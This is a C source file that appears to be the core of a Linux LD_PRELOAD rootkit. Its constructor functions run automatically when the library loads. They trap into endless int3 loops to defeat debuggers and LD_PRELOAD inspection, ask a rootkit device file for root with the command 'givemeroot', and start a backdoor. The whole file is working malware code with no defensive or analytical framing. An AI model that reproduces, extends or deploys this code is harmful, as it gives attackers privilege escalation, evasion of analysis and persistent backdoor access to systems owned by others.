#define _GNU_SOURCE

#include <stdarg.h>
#include <stdint.h>
#include <signal.h>
#include <pthread.h>

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>

#include "include/config.h"
#include "include/common.h"
#include "include/dlsym.h"
#include "include/bkdoor.h"
#include "include/misc.h"

extern char **environ;
extern void *(*real_dlsym)(void *handle, const char *name);

static int proc_uid, proc_gid;

pid_t proc_id;
void *libc;

static int rk_exec(const char *file, const char *cmdfmt, ...)
{
    int fd;

    char cmdbuf[128] = "";
    va_list args;

    va_start(args, cmdfmt);
    vsprintf(cmdbuf, cmdfmt, args);
    va_end(args);

    if((fd = open(file, O_WRONLY)) < 0)
        return -1;

#ifdef DEBUG
    printf("Executing: %s\r\n", cmdbuf);
#endif

    write(fd, cmdbuf, strlen(cmdbuf));

    close(fd);

    return 0;
}

int main(void)
{
    int i;
    for(i = 0; i < 60; i++)
    {
#ifdef DEBUG
        printf("Sleeping for 1 second!\r\n");
#endif
        sleep(1);
    }

    return 0;
}

__attribute__((constructor (101))) void anti_tricks(void)
{
    int i;
    volatile int pt_offset = 0;
    char env[] = "LD_PRELOAD";

    signal(SIGTRAP, NULL);

    for(i = 0; environ[i]; i++)
    {
        int ii;
        for(ii = 0; env[ii] != '\0' && environ[i][ii] != '\0'; ii++)
        {
            if(env[ii] != environ[i][ii])
                break;
        }

        if(env[ii] == '\0')
        {
            do
            {
                __asm__("   \
                    int3    \
                ");
            } while(1);

            return;
        }
    }

    if(ptrace(PTRACE_TRACEME, 0, 1, 0) == 0)
    {
        pt_offset = 7331;
    }

    if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)
    {
        if(pt_offset != 7331)
        {
            do
            {
                __asm__("   \
                    int3    \
                ");
            } while(1);
        }
        else
            pt_offset = (pt_offset * 1337);
    }

    if(pt_offset != (7331 * 1337))
    {
        do
        {
            __asm__("   \
                int3    \
            ");
        } while(1);
    }
}

__attribute__((constructor (102))) void pre_core(void)
{
    proc_id = getpid();
    proc_uid = getuid();
    proc_gid = getgid();

    libc = dlopen(LIBC_PATH, RTLD_LAZY);

    if(!real_dlsym)
        find_dlsym();
}

__attribute__((constructor (103))) int post_core(void)
{
#ifdef DEBUG
    printf("Normal Operation!\r\n");
#endif

    if(proc_uid != 0)
    {
#ifdef DEBUG
        printf("We're not root, using rootkit to gain root...\r\n");
#endif
        rk_exec(RK_PATH, "givemeroot");
    }
    else
    {
#ifdef DEBUG
        printf("We're already root, skip rootkit to gain root...\r\n");
#endif
    }

    if(init_bkdoor() < 0)
    {
#ifdef DEBUG
        printf("Failed initiating backdoor!\r\n");
#endif
    }

    //TODO: Build better dhproc in rootkit
    //rk_exec(RK_PATH, "dhproc%d", proc_id);

    setuid(proc_uid);
    setgid(proc_gid);

    return 0;
}
